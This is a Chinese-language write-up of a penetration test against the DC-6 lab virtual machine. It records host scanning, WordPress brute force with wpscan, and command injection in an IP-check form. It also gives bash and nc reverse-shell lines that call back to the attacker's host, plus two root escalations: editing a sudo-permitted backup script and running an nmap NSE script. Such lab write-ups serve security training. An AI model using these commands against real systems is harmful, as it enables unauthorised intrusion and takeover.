1.使用nmap -sP 192.168.89.0/24扫描整个网段或者arp-scan -l 扫描当前网段拿到靶机ip
19└─# arp-scan -l 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:29:9e:99, IPv4: 192.168.89.134
Starting arp-scan 1.10.0 with 256 hosts ([https://github.com/royhills/arp-scan)](https://github.com/royhills/arp-scan))
192.168.89.1    00:50:56:c0:00:08       VMware, Inc.
192.168.89.2    00:50:56:f7:76:f0       VMware, Inc.
192.168.89.153  00:0c:29:a0:12:99       VMware, Inc.
192.168.89.254  00:50:56:e7:0d:f1       VMware, Inc.
​
2.查看靶机web页面并使用dirsearch进行目录扫描
dirsearch -u http://wordy
发现wp-login.php这个登录页面  然后这里也发现这个博客是使用的WordPress的cms，
​
3.账户登录爆破
wpscan --url http://wordy  -e u可以获取到所有的用户名 
然后这里我首先考虑的是也是使用wpscan搜集密码进行爆破，但是教程说这个不行的，得用kali自带的密码字典
所以使用密码字典爆破 wpscan --url [http://wordy](http://wordy) -P passwords.txt -U dc-6-name.txt   拿到 
mark helpdesk01  这个账号登录密码 登录后找到一个传入ip进行检测的位置 ，因为对输入长度有限制，所以要用burpsuite抓包后再改内容 127.0.0.1|whoami/bash -i >&/dev/tcp/192.168.89.134/12223 0>&1 ,但是实际上这个反弹shell的不行，还要用到nc的这个nc 192.168.89.134 -e /bin/bash可以反弹成功 然后在用python -c 'import pty; pty.spawn("/bin/bash")' 启动交互式的shell 然后去查看mark的目录下找到一个things-to-do.txt的文件，里面有graham的账号密码helpdesk01，登录后再查看文件，发现还是一样的，那么就要尝试提权了，
​
4.graham账户提权
执行sudo-l 发现graham@dc-6:~$ sudo -l
sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
​
User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
意思就是说jens这个账户可以免密执行backups.sh这个文件，那么我们可以往这个文件里加入/bin/bash那么这个文件执行后就会弹一个bash的shell出来 
echo '/bin/bash' >> backups.sh
 sudo ./backups.sh   尝试直接使用graham的用户执行，失败了
sudo -u jens ./backups.sh  使用jens的账户执行，成功弹了一个jens的shell
​
5.jens账户提权 sudo-l 
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
​
User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
jens可以免密以root的身份执行nmap，先写一个弹shell的脚本，那么只要我们使用nmap去执行这个脚本，那么这个shell就具有root权限了，具体的原理在常用命令的sudo提权的位置,注意要在jens目录下写这个脚本 home目录下没有权限
 echo 'os.execute("/bin/sh")' >getshell.nse  
 sudo nmap --script=/home/jens/getshell.nse  绝对路径执行脚本
执行完代码后拿到root权限，然后在root目录下找到最后的flag文件，至此靶机渗透完成
